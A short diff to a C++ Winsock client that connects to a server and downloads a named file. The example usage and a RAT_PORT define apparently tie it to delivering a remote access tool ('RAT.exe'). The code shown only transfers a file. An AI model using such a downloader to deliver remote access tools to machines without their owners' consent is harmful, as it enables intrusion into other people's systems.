@@ -15,7 +15,10 @@
 //
 // Pass the server name, port number, and file name on the command line. 
 //
-// Example: Client MyMachineName 2000 RAT.exe
+// Example: Client.exe MyMachineName|IP 2020 RAT.exe
+//
+// Written by: Alexandre Cox
+// Date: 04/04/2018
 //
 #include <stdio.h>
 #include <winsock.h>
@@ -31,7 +34,7 @@
 using namespace std;
 
 //Define for port and host arguments
-#define HARD_CODED_ARGS
+//#define HARD_CODED_ARGS
 #define SERVER_NAME "127.0.0.1" //Can be Name or IP address
 #define MY_PORT 2020
 #define RAT_PORT 2030
@@ -146,7 +149,9 @@ int StreamClient(char *szServer, short nPort, string paramFileName)
 		try
 		{
 			Connection OpenConnect(nPort, szServer);
-			if (OpenConnect.recvFile(getFileName(paramFileName))) {
+			if (OpenConnect.sendMessage(paramFileName) &&
+				OpenConnect.recvFile(getFileName(paramFileName)))
+			{
 			  success = true;
 			}
 			else{
